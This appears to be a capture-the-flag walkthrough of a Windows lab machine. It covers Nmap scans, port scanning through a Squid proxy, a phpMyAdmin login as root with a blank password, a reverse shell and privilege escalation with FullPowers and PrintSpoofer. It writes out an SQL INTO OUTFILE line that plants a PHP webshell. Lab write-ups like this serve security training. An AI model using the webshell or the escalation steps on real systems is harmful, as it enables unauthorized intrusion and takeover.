Nmap scan

```sh
nmap -p- --min-rate 5000 -T4 -Pn 192.168.109.189
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-25 10:49 IST
Nmap scan report for 192.168.109.189
Host is up (0.067s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3128/tcp  open  squid-http
49666/tcp open  unknown
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
```

```sh
nmap -sC -sV -T4 -Pn -p 135,139,445,3128,49666,49667 192.168.109.189
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-25 10:50 IST
Nmap scan report for 192.168.109.189
Host is up (0.060s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-25T05:21:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.41 seconds
```

Enumerating SMB.

![](Images/Squid1.png)

Visited port web server on port 3128.

![](Images/Squid2.png)

We are familiar with proxies, [Burp Suite](https://portswigger.net/burp) is another web proxy we use quite frequently. In summary, rather than directly access that dirty slow internet, this service is acting as a go-between from the server to the outside world at large. It offers security (allegedly) and speed improvements in the form of caching frequent destinations.

We searched for public exploit. But nothing close to our version.

![](Images/Squid3.png)

We googled about squid proxy and found below.

https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html

Above hacktricks blog gives us some tools to work with.

We learn that we can use a **Squid Pivoting Open Port Scanner (spose.py)** to detect open ports behind the S_quid_ proxy

![](Images/Squid4.png)

Spose download link.

https://github.com/aancw/spose

```sh
python spose.py --proxy http://192.168.109.189:3128 --target 192.168.109.189
```

![](Images/Squid5.png)

We discover open ports **8080** and **3306**.

In order to access port 8080, which is likely HTTP, we add the _squid_ proxy to _foxyproxy (_[https://addons.mozilla.org/en-CA/firefox/addon/foxyproxy-basic/](https://addons.mozilla.org/en-CA/firefox/addon/foxyproxy-basic/))

We do this by inputting the Proxy type, IP address and Port

![](Images/Squid6.png)

![](Images/Squid7.png)

Now you can select it from the available proxies like you would Burp Suite and navigate to the discovered open port 8080.

![](Images/Squid8.png)

As we clicked on the `phpinfo()` , we are redirected to below.

![](Images/Squid9.png)

We have 2 main pages.

![](Images/Squid10.png)

Opened `phpmyadmin`.

![](Images/Squid11.png)

![](Images/Squid12.png)

We are successfully logged in using `root` and blank password.

![](Images/Squid13.png)

![](Images/Squid14.png)

![](Images/Squid15.png)

Additionally, when we clicked on `SQL` we got the console.

![](Images/Squid17.png)

From `phpinfo()`, we got to know the server root directory.

![](Images/Squid16.png)


![](Images/Squid18.png)

https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

![](Images/Squid19.png)

We will create a new file called uploader.php in the root web directory that allows us to upload a shell.

Go to the SQL Tab and insert this code:

![](Images/Squid20.png)

Click the ‘Go’ button and we are set.

![](Images/Squid21.png)

Then browse to the newly created php file:

![](Images/Squid22.png)

Now we can upload the shell of our choice.

![](Images/Squid23.png)

Copy it to a file and upload it.

![](Images/Squid24.png)

![](Images/Squid25.png)

![](Images/Squid26.png)

Then we need to set up a listener. Be sure to use rlwrap to preserve arrow functionality upon connection. I like to use port 135 on Windows because I know it allows egress traffic.

Finally, we browse to our newly uploaded rev-shell. It is also located in the root web directory.

![](Images/Squid27.png)

We got the shell.

![](Images/Squid28.png)

Captured local flag.

![](Images/Squid29.png)

We re able to read local flag, but we cant read administrator flag. So we moved back to getting shell process and tried different shell.

```sql
SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE 'C:/wamp/www/webshell.php';
```

is trying to:

- Write a PHP file on the web server
- Execute system commands via URL parameter (`?c=whoami`)

For this to work, several conditions must be true:

- MySQL has **FILE privilege**
- The directory is **writable by MySQL**
- The path is correct (e.g., `C:\wamp\www\`)
- PHP execution is enabled in that directory

![](Images/Squid30.png)

![](Images/Squid31.png)

Generated reverse shell using msfvenom and transferred it to the target.

![](Images/Squid32.png)

![](Images/Squid33.png)

Started nc.

![](Images/Squid34.png)

Still we cant access administrator.

![](Images/Squid35.png)

We followed different blog for privilege escalation.

### Privilege Escalation
Find we are running as nt authority/local system but some privileges assigned to this account are missing:

![](Images/Squid36.png)

#### Googled "local service restricted permissions github" and found the following tool to add the missing privileges back:

![](Images/Squid37.png)

https://github.com/itm4n/FullPowers

To download fullpowers exe version follow below link

https://github.com/itm4n/FullPowers/releases

![](Images/Squid38.png)

![](Images/Squid39.png)

![](Images/Squid40.png)

Now I have more Privileges including SetImpersonatePrivilges.

![](Images/Squid41.png)

![](Images/Squid42.png)

![](Images/Squid43.png)

I downloaded the .exe file from below.

https://github.com/dievus/printspoofer

I uploaded the PrintSpoofer.exe to the windows machine.

![](Images/Squid44.png)

Now I can run it as per the documentations.

Download the PrintSpoofer.exe in the directory where you landed after getting shell. `C:\wamp\www`

https://github.com/itm4n/PrintSpoofer/tree/master

![](Images/Squid45.png)

For getting shell:

https://medium.com/@Dpsypher/proving-grounds-practice-squid-1bc1e2dbb8d4

https://infosecwriteups.com/proving-grounds-practice-squid-walkthrough-f761d2da973f

For privilege escalation:

https://medium.com/@mahdi_78420/squid-walkthrough-practice-e0fc15b77212